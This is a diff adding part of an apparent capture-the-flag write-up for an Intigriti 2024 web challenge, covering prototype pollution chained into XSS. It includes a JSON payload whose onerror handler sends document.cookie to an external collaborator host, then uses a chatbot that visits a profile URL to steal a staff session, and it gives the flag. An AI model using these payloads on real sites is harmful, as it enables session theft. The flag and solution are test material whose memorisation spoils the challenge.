@@ -724,3 +724,51 @@ Let's test out simple prototype pollution if we can inject more properties. <br>
     }
 }
 ```
+![Work Break Prototype Pollution](/assets/img/Intigriti-ctf_2024/work_break_prototype_pollution.png)
+
+It shows "Settings updated successfully". Now we can inject more properties and curl to our burp collaborator to get the SID. <br>
+```json
+{
+    "name":"Anon",
+    "phone":"0909099099",
+    "position":"<img src=x>",
+    "__proto__":{
+        "tasks":[
+            {
+                "date":"2024-11-20",
+                "tasksCompleted":"<img src=x onerror='window.parent.postMessage({\"totalTasks\":\"<img src=x onerror=fetch(`https://o9y20fd7zfcjwt8rgxk0vut8uz0qotci.oastify.com/`+document.cookie)>\"}, \"*\");'>"
+            }
+        ]
+    }
+}
+```
+![Work Break Prototype Pollution 2](/assets/img/Intigriti-ctf_2024/work_break_prototype_pollution_2.png)
+
+When we reload the profile page, we can see there is appears:
+```
+Total tasks completed: error image
+Tasks Completed Today: error image
+```
+![Work Break Prototype Pollution 3](/assets/img/Intigriti-ctf_2024/work_break_prototype_pollution_3.png)
+
+Check the burp collaborator and we got the SID. <br>
+![Work Break SID](/assets/img/Intigriti-ctf_2024/work_break_sid.png)
+```
+SID=a477a376-be80-4534-a0ae-4599b950a417
+```
+
+Finally, we let check the chatbot. <br>
+![Work Break Chatbot](/assets/img/Intigriti-ctf_2024/work_break_chatbot.png)
+
+The chatbot says that give me the profile URL and it will check what is the profile. We will follow the instruction to see what happen. <br>
+```
+https://workbreak-0.ctf.intigriti.io/profile/be6a3773-9a03-4f19-a3c0-518845b9ae52
+```
+![Work Break Chatbot 2](/assets/img/Intigriti-ctf_2024/work_break_chatbot_2.png)
+
+We can see the response that "Logging into my staff account." Let's check out the burp collaborator again. <br>
+![Work Break Chatbot 3](/assets/img/Intigriti-ctf_2024/work_break_chatbot_3.png)
+
+We got the flag. <br>
+
+**Flag:** `INTIGRITI{5up3r_u53r_535510n}`
